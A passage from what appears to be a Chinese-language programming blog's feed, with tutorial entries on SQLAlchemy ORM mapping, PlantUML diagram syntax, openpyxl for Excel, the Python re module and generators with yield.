30</span></code></pre></div></div><h2 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h2><ul><li><p><a href="https://stackoverflow.com/questions/38519349/how-to-use-sqlalchemy-with-class-attributes-and-properties/38526500#38526500">https://stackoverflow.com/questions/38519349/how-to-use-sqlalchemy-with-class-attributes-and-properties/38526500#38526500</a></p></li><li><p><a href="https://docs.sqlalchemy.org/en/14/orm/inheritance.html">https://docs.sqlalchemy.org/en/14/orm/inheritance.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> sqlalchemy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python SqlAlchemy ORM</title>
      <link href="/2021/11/12/python-orm/"/>
      <url>/2021/11/12/python-orm/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是ORM"><a href="#什么是ORM" class="headerlink" title="什么是ORM"></a>什么是ORM</h2><p>ORM（Object Relationship Mapping）是一种将数据库表和对象的关系映射起来的方法。是完整软件的必要部分，将数据持久化。</p><p>映射关系如下图所示</p><p><img src="/2021/11/12/python-orm/1.png"></p><p>常用的ORM框架是SqlAlchemy，它提供了一个简单接口，无需使用SQL语句就可以完成对数据库的操作。</p><h2 id="经典映射模式"><a href="#经典映射模式" class="headerlink" title="经典映射模式"></a>经典映射模式</h2><p>使用经典映射模式，有一个好处就是将对象和表之间的映射关系解耦，将数据库的操作抽象出来，提高代码的可维护性。</p><div class="codeBlockContainer"><div class="codeBlockTitle">model.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Device</span>:</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, device_id: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">        self.device_id: <span class="hljs-built_in">str</span> = device_id</span><span class="line">        self.hostname: <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span></span><span class="line">        self.version: <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span></span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy.orm <span class="hljs-keyword">import</span> mapper, relationship</span><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> (</span><span class="line">    Table,</span><span class="line">    MetaData,</span><span class="line">    Column,</span><span class="line">    Integer,</span><span class="line">    String</span><span class="line">)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">import</span> model</span><span class="line"></br></span><span class="line">metadata = MetaData()</span><span class="line"></br></span><span class="line">devices = Table(</span><span class="line">    <span class="hljs-string">&#x27;devices&#x27;</span>,</span><span class="line">    metadata,</span><span class="line">    Column(<span class="hljs-string">&#x27;id&#x27;</span>, Integer, primary_key=<span class="hljs-literal">True</span>, autoincrement=<span class="hljs-literal">True</span>),</span><span class="line">    Column(<span class="hljs-string">&#x27;device_id&#x27;</span>, String(<span class="hljs-number">255</span>), nullable=<span class="hljs-literal">False</span>),</span><span class="line">    Column(<span class="hljs-string">&#x27;hostname&#x27;</span>, String(<span class="hljs-number">255</span>)),</span><span class="line">    Column(<span class="hljs-string">&#x27;version&#x27;</span>, String(<span class="hljs-number">255</span>))</span><span class="line">)</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_mapper</span>():</span></span><span class="line">    mapper(model.Device, devices)</span></code></pre></div></div><h2 id="关系映射模式"><a href="#关系映射模式" class="headerlink" title="关系映射模式"></a>关系映射模式</h2><p>使用方法参考<a href="/2021/11/12/python-sqlalchemy-%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E8%A1%A8/" title="python sqlalchemy 继承关系表">python sqlalchemy 继承关系表</a></p><h2 id="ORM事件"><a href="#ORM事件" class="headerlink" title="ORM事件"></a>ORM事件</h2><p>当ORM与类属性映射不能做到一一对应的情况下，重新获取类时没有覆盖到的属性不会被初始化，这种情况下，可以使用<code>load</code>事件在创建实例后立即对属性进行初始化。</p><div class="codeBlockContainer"><div class="codeBlockTitle">orm.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> sqlalchemy <span class="hljs-keyword">import</span> event</span><span class="line"></br></span><span class="line"><span class="hljs-meta">@event.listens_for(<span class="hljs-params">Device, <span class="hljs-string">&#x27;load&#x27;</span></span>)</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">receive_load</span>(<span class="hljs-params">target, _</span>):</span></span><span class="line">    target.uname = <span class="hljs-string">&#x27;uname&#x27;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PlantUML</title>
      <link href="/2021/11/03/PlantUML/"/>
      <url>/2021/11/03/PlantUML/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://plantuml.com/zh/deployment-diagram"><strong>所有图例汇总</strong></a></li></ul><h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="/2021/11/03/PlantUML/1-1.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">abstract        抽象</span><span class="line">abstract class  抽象(等同abstract)</span><span class="line">annotation      注解</span><span class="line">circle          圆</span><span class="line">()              圆缩写形式</span><span class="line">class           类</span><span class="line">diamond         菱形</span><span class="line">&lt;&gt;              菱形写形式</span><span class="line">entity          实例</span><span class="line">enum            枚举</span><span class="line">interface       接口</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/1-2.png"></p><p>线标记</p><ul><li><code>--|&gt;</code> 继承</li><li><code>--*</code> 组合</li><li><code>--o</code> 聚合</li></ul><p>方法和属性的访问性质</p><ul><li><code>+</code> public</li><li><code>-</code> private</li><li><code>#</code> protected</li><li><code>~</code> package</li></ul><h3 id="辅助布局"><a href="#辅助布局" class="headerlink" title="辅助布局"></a>辅助布局</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line"></br></span><span class="line">class Bar1</span><span class="line">class Bar2</span><span class="line">together &#123;</span><span class="line">  class Together1</span><span class="line">  class Together2</span><span class="line">  class Together3</span><span class="line">&#125;</span><span class="line">Together1 - Together2</span><span class="line">Together2 - Together3</span><span class="line">Together2 -[hidden]--&gt; Bar1</span><span class="line">Bar1 -[hidden]&gt; Bar2</span><span class="line"></br></span><span class="line"></br></span><span class="line">@enduml</span></code></pre></div></div><p>加入了<code>together</code>和<code>-[hidden]-</code>来支持辅助布局</p><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml namespace</span><span class="line"></br></span><span class="line">class net.Network &#123;</span><span class="line">    int address</span><span class="line"></br></span><span class="line">    ip_prefix()</span><span class="line">&#125;</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/1-3.png"></p><h2 id="时序图"><a href="#时序图" class="headerlink" title="时序图"></a>时序图</h2><p><img src="/2021/11/03/PlantUML/2-1.png"></p><ul><li>++ 激活目标（可选择在后面加上#color）</li><li>– 撤销激活源</li><li>** 创建目标实例</li><li>!! 摧毁目标实例</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">alice -&gt; bob ++: hello</span><span class="line">bob -&gt; bob ++: self call</span><span class="line">bob -&gt; bib ++ #green: hello</span><span class="line">bob -&gt; george **: **create**</span><span class="line">return done</span><span class="line">return rc</span><span class="line">bob -&gt; george !! : delete</span><span class="line">return succuse</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/2-2.png"></p><p>锚点和持续时间</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">!pragma teoz true</span><span class="line"></br></span><span class="line">&#123;start&#125; Alice -&gt; Bob : start doing things during duration</span><span class="line">Bob -&gt; Max : something</span><span class="line">Max -&gt; Bob : something else</span><span class="line">&#123;end&#125; Bob -&gt; Alice : finish</span><span class="line"></br></span><span class="line">&#123;start&#125; &lt;-&gt; &#123;end&#125; : some time</span><span class="line"></br></span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/2-3.png"></p><h2 id="用例图"><a href="#用例图" class="headerlink" title="用例图"></a>用例图</h2><p><img src="/2021/11/03/PlantUML/3-1.png"></p><p><img src="/2021/11/03/PlantUML/3-2.png"></p><h2 id="活动图"><a href="#活动图" class="headerlink" title="活动图"></a>活动图</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line"></br></span><span class="line">start</span><span class="line">:ClickServlet.handleRequest();</span><span class="line">:new page;</span><span class="line">if (Page.onSecurityCheck) then (true)</span><span class="line">  :Page.onInit();</span><span class="line">  if (isForward?) then (no)</span><span class="line">    :Process controls;</span><span class="line">    if (continue processing?) then (no)</span><span class="line">      stop</span><span class="line">    endif</span><span class="line"></br></span><span class="line">    if (isPost?) then (yes)</span><span class="line">      :Page.onPost();</span><span class="line">    else (no)</span><span class="line">      :Page.onGet();</span><span class="line">    endif</span><span class="line">    :Page.onRender();</span><span class="line">  endif</span><span class="line">else (false)</span><span class="line">endif</span><span class="line"></br></span><span class="line">if (do redirect?) then (yes)</span><span class="line">  :redirect process;</span><span class="line">else</span><span class="line">  if (do forward?) then (yes)</span><span class="line">    :Forward request;</span><span class="line">  else (no)</span><span class="line">    :Render page template;</span><span class="line">  endif</span><span class="line">endif</span><span class="line"></br></span><span class="line">stop</span><span class="line"></br></span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/4-1.png"></p><p><img src="/2021/11/03/PlantUML/4-2.png"></p><h2 id="组件图"><a href="#组件图" class="headerlink" title="组件图"></a>组件图</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">title **组件图**</span><span class="line"></br></span><span class="line">package &quot;ServiceLayer&quot; &#123;</span><span class="line">    [MessageBus] as bus</span><span class="line">    bus -&gt; [Handlers]</span><span class="line">    component &quot;Unit of Work&quot; &#123;</span><span class="line">        [Abstract UoW] as abuow</span><span class="line">        abuow &lt;|. [SQLA UoW]</span><span class="line">    &#125;</span><span class="line">    [Handlers] -&gt; abuow</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">cloud cloud</span><span class="line">cloud --&gt; [API]</span><span class="line"></br></span><span class="line">[API] --&gt; bus : Commands</span><span class="line">[Eventconsumer] --&gt; bus : Commands</span><span class="line"></br></span><span class="line">[API] --&gt; [Bootstrap]</span><span class="line">[Eventconsumer] --&gt; [Bootstrap]</span><span class="line">[Bootstrap] --&gt; bus</span><span class="line"></br></span><span class="line"></br></span><span class="line">package &quot;Adapters&quot; &#123;</span><span class="line">    component &quot;Repositories&quot; &#123;</span><span class="line">        [Abstract Repository] as abrepo</span><span class="line">        abrepo &lt;|. [SQLA Repository]</span><span class="line">    &#125;</span><span class="line">    [Redis\nEvent\nPublisher] as redis</span><span class="line">    [etc]</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">abuow --&gt; abrepo</span><span class="line">[SQLA UoW] --&gt; [SQLA Repository]</span><span class="line"></br></span><span class="line"></br></span><span class="line">package &quot;Domain&quot; &#123;</span><span class="line">    [Aggregate] -&gt; [Entity]</span><span class="line">    [Entity] --&gt; [Value Object]</span><span class="line">    [Event]</span><span class="line">    [Command]</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">Adapters -&gt; Domain</span><span class="line"></br></span><span class="line">database database</span><span class="line"></br></span><span class="line">[External Message Broker] as ex_message</span><span class="line">ex_message --&gt; [Eventconsumer]</span><span class="line">ex_message &lt;-- redis</span><span class="line"></br></span><span class="line">[SQLA Repository] --&gt; database</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/5-1.png"></p><p><img src="/2021/11/03/PlantUML/5-2.png"></p><h2 id="状态图"><a href="#状态图" class="headerlink" title="状态图"></a>状态图</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">state choice1 &lt;&lt;choice&gt;&gt;</span><span class="line">state fork1   &lt;&lt;fork&gt;&gt;</span><span class="line">state join2   &lt;&lt;join&gt;&gt;</span><span class="line">state end3    &lt;&lt;end&gt;&gt;</span><span class="line"></br></span><span class="line">[*]     --&gt; choice1 : from start\nto choice</span><span class="line">choice1 --&gt; fork1   : from choice\nto fork</span><span class="line">choice1 --&gt; join2   : from choice\nto join</span><span class="line">choice1 --&gt; end3    : from choice\nto end</span><span class="line"></br></span><span class="line">fork1   ---&gt; State1 : from fork\nto state</span><span class="line">fork1   --&gt; State2  : from fork\nto state</span><span class="line"></br></span><span class="line">State2  --&gt; join2   : from state\nto join</span><span class="line">State1  --&gt; [*]     : from state\nto end</span><span class="line"></br></span><span class="line">join2   --&gt; [*]     : from join\nto end</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/6-1.png"></p><p><img src="/2021/11/03/PlantUML/6-2.png"></p><h2 id="对象图"><a href="#对象图" class="headerlink" title="对象图"></a>对象图</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startuml</span><span class="line">object London</span><span class="line">object Washington</span><span class="line">object Berlin</span><span class="line">object NewYork</span><span class="line"></br></span><span class="line">map CapitalCity &#123;</span><span class="line"> UK *-&gt; London</span><span class="line"> USA *--&gt; Washington</span><span class="line"> Germany *---&gt; Berlin</span><span class="line">&#125;</span><span class="line"></br></span><span class="line">NewYork --&gt; CapitalCity::USA</span><span class="line">@enduml</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/7-1.png"></p><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">@startmindmap</span><span class="line">caption figure 1</span><span class="line">title My super title</span><span class="line"></br></span><span class="line">* &lt;&amp;flag&gt;Debian</span><span class="line">** &lt;&amp;globe&gt;Ubuntu</span><span class="line">*** Linux Mint</span><span class="line">*** Kubuntu</span><span class="line">*** Lubuntu</span><span class="line">*** KDE Neon</span><span class="line">** &lt;&amp;graph&gt;LMDE</span><span class="line">** &lt;&amp;pulse&gt;SolydXK</span><span class="line">** &lt;&amp;people&gt;SteamOS</span><span class="line">** &lt;&amp;star&gt;Raspbian with a very long name</span><span class="line">*** &lt;s&gt;Raspmbc&lt;/s&gt; =&gt; OSMC</span><span class="line">*** &lt;s&gt;Raspyfi&lt;/s&gt; =&gt; Volumio</span><span class="line"></br></span><span class="line">left side</span><span class="line"></br></span><span class="line">** Windows 95</span><span class="line">** Windows 98</span><span class="line">** Windows NT</span><span class="line">*** Windows 8</span><span class="line">*** Windows 10</span><span class="line"></br></span><span class="line"></br></span><span class="line">header</span><span class="line">My super header</span><span class="line">endheader</span><span class="line"></br></span><span class="line">center footer My super footer</span><span class="line"></br></span><span class="line">legend right</span><span class="line">  Short</span><span class="line">  legend</span><span class="line">endlegend</span><span class="line">@endmindmap</span></code></pre></div></div><p><img src="/2021/11/03/PlantUML/8-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plantuml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python execl模块</title>
      <link href="/2021/10/25/python-execl%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/10/25/python-execl%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<p>python 中使用execl推荐使用<code>openpyxl</code>模块</p><h2 id="创建表和保存"><a href="#创建表和保存" class="headerlink" title="创建表和保存"></a>创建表和保存</h2><h3 id="创建新表"><a href="#创建新表" class="headerlink" title="创建新表"></a>创建新表</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">wb = pyopenxl.Workbook() <span class="hljs-comment"># 创建新Excel</span></span><span class="line">sheet = wb.active  <span class="hljs-comment"># 获取激活的表，也就是第一个</span></span></code></pre></div></div><h3 id="加载已有的Excel"><a href="#加载已有的Excel" class="headerlink" title="加载已有的Excel"></a>加载已有的Excel</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">wb = pyopenxl.load_workbook(filename=<span class="hljs-string">&#x27;path.xlsx&#x27;</span>)</span><span class="line">sheet = wb[<span class="hljs-string">&#x27;Sheet1&#x27;</span>] <span class="hljs-comment"># 获取表</span></span></code></pre></div></div><h3 id="修改表名"><a href="#修改表名" class="headerlink" title="修改表名"></a>修改表名</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">sheet.title = <span class="hljs-string">&#x27;new_sheet_name&#x27;</span></span></code></pre></div></div><h3 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">wb.save(<span class="hljs-string">&#x27;path.xlsx&#x27;</span>)</span></code></pre></div></div><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>行迭代器</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> sheet.iter_rows(min_row=<span class="hljs-number">1</span>, max_row=sheet.max_row, min_col=<span class="hljs-number">1</span>, max_col=<span class="hljs-number">3</span>):</span><span class="line">    <span class="hljs-keyword">for</span> cell <span class="hljs-keyword">in</span> row:</span><span class="line">        ...</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python re模块</title>
      <link href="/2021/10/22/python-re%E6%A8%A1%E5%9D%97/"/>
      <url>/2021/10/22/python-re%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://docs.python.org/zh-cn/3/howto/regex.html">官方中文文档</a></li></ul><h2 id="re-模块下的常用方法"><a href="#re-模块下的常用方法" class="headerlink" title="re 模块下的常用方法"></a>re 模块下的常用方法</h2><ul><li>查找所有</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.findall(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;alvin yuan&#x27;</span>)</span></code></pre></div></div><p>返回所有满足匹配条件的结果, 放在列表里</p><ul><li>查找（只到找到第一个匹配）</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.search(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;alvin yuan&#x27;</span>).group()</span></code></pre></div></div><p>函数会在字符串内查找模式匹配, 只到找到第一个匹配然后返回一个包含匹配信息的对象, 该对象可以<br>通过调用<code>group()</code>方法得到匹配的字符串, 如果字符串没有匹配，则返回<code>None</code>。</p><ul><li>查找（仅在字符串开始处进行匹配）</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.match(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>).group()</span></code></pre></div></div><p>同<code>search</code>, 不过仅在字符串开始处进行匹配</p><ul><li>将查找的内容作为迭代器</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">for</span> match <span class="hljs-keyword">in</span> re.finditer(<span class="hljs-string">&#x27;\d&#x27;</span>,<span class="hljs-string">&#x27;ds3sy4784a&#x27;</span>):</span><span class="line">    <span class="hljs-built_in">print</span>(match.group())</span></code></pre></div></div><ul><li>分割</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">ret=re.split(<span class="hljs-string">&#x27;[ab]&#x27;</span>,<span class="hljs-string">&#x27;abcd&#x27;</span>)</span></code></pre></div></div><p>先按’a’分割’a’的左边无内容，则左边得到’’和右边’bcd’, 在对’’和’bcd’分别按’b’分割</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-built_in">print</span>(ret)<span class="hljs-comment">#[&#x27;&#x27;, &#x27;&#x27;, &#x27;cd&#x27;]</span></span></code></pre></div></div><ul><li>替换</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">ret=re.sub(<span class="hljs-string">&#x27;\d&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;alvin5yuan6&#x27;</span>,<span class="hljs-number">1</span>)</span></code></pre></div></div><p><code>re.sub(参 1, 参 2, 参 3, 参 4) </code>参 1 表示匹配规则或字符，参 2 表示要替换成的字符串，参 3 表示被匹配的字符串，参 4 表示指定匹配次数</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">re.subn(<span class="hljs-string">&#x27;\d&#x27;</span>,<span class="hljs-string">&#x27;abc&#x27;</span>,<span class="hljs-string">&#x27;alvin5yuan6&#x27;</span>)</span></code></pre></div></div><p>返回一个元组，分别为替换后字符串，和本次替换的次数</p><ul><li>编译（自定义规则）可重复使用</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">obj=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;\d&#123;3&#125;&#x27;</span>)            <span class="hljs-comment">#返回一个规则对象</span></span><span class="line">ret=obj.search(<span class="hljs-string">&#x27;abc123eeee&#x27;</span>)      <span class="hljs-comment">#规则对象可以调用.search()  .findall等方法 </span></span><span class="line"><span class="hljs-built_in">print</span>(ret.group())<span class="hljs-comment">#123</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python yield 详解</title>
      <link href="/2021/10/18/python-yield-%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/10/18/python-yield-%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>要理解<code>yield</code>，首先要清楚在有yield的函数，在执行的时候，其实返回的一个生成器对象。然后通过<code>next()</code>执行到yield语句停下，并返回yield所跟的值，然后一直等待<code>next()</code>的执行</p><h2 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;starting...&quot;</span>)</span><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><span class="line">        res = <span class="hljs-keyword">yield</span> <span class="hljs-number">4</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;res:&quot;</span>,res)</span><span class="line">g = foo()</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g))</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*&quot;</span>*<span class="hljs-number">20</span>)</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(g))</span></code></pre></div></div><p>输出：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-markdown codeBlockLines"><span class="line">starting...</span><span class="line">4</span><span class="line"><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span></span><span class="line">res: None</span><span class="line">4</span></code></pre></div></div><p>流程是：</p><ol><li><code>g = foo()</code>得到的是生成器对象，还并没有执行。</li><li><code>next((g))</code>执行g生成器知道yield语句，并返回4。</li><li>打印<code>*</code></li><li><code>next(g)</code>继续执行，但是没有<code>send()</code>给出值，所有res为None</li></ol><p>如果想要让res获得值，那么将第二个<code>next(g)</code>换成<code>next(g,5)</code>，这样res就可以获得值5。或者<code>g.send(5)</code>也是一样。</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>如果一次次的调用<code>next()</code>未免也太过麻烦了，大多数情况可以使用<code>for()</code>来遍历生成器。也样也可避免使用<code>StopIteration</code>异常来停止遍历。</p><h2 id="with语句"><a href="#with语句" class="headerlink" title="with语句"></a>with语句</h2><p>使用上下文管理器</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span></span><span class="line">        self.name = name</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Query info about %s...&#x27;</span> % self.name)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-meta">@contextmanager</span></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_query</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Begin&#x27;</span>)</span><span class="line">    q = Query(name)</span><span class="line">    <span class="hljs-keyword">yield</span> q</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;End&#x27;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">with</span> create_query(<span class="hljs-string">&#x27;Bob&#x27;</span>) <span class="hljs-keyword">as</span> q:</span><span class="line">    q.query()</span></code></pre></div></div><p>输出：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-mathematica codeBlockLines"><span class="line"><span class="hljs-built_in">Begin</span></span><span class="line"><span class="hljs-built_in">Query</span> <span class="hljs-variable">info</span> <span class="hljs-variable">about</span> <span class="hljs-variable">Bob</span><span class="hljs-operator">...</span></span><span class="line"><span class="hljs-built_in">End</span></span></code></pre></div></div><h2 id="yield-from"><a href="#yield-from" class="headerlink" title="yield from"></a>yield from</h2><p>看个例子</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g1</span>():</span>     </span><span class="line">     <span class="hljs-keyword">yield</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)</span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g2</span>():</span></span><span class="line">     <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)</span><span class="line"></br></span><span class="line">it1 = g1()</span><span class="line">it2 = g2()</span><span class="line"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> it1:</span><span class="line">    <span class="hljs-built_in">print</span>(x)</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> it2:</span><span class="line">    <span class="hljs-built_in">print</span>(x)</span></code></pre></div></div><p>输出:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stylus codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-title">range</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">5</span>)</span></span></span><span class="line"><span class="hljs-number">0</span></span><span class="line"><span class="hljs-number">1</span></span><span class="line"><span class="hljs-number">2</span></span><span class="line"><span class="hljs-number">3</span></span><span class="line"><span class="hljs-number">4</span></span></code></pre></div></div><p>可以知道yield返回的是可迭代对象，而<code>yield from</code>返回的是迭代器执行后每个item。</p><p><strong>所以<code>yield from iterable</code>的本质就是<code>for item in iterable: yield item</code></strong></p><h2 id="取返回值"><a href="#取返回值" class="headerlink" 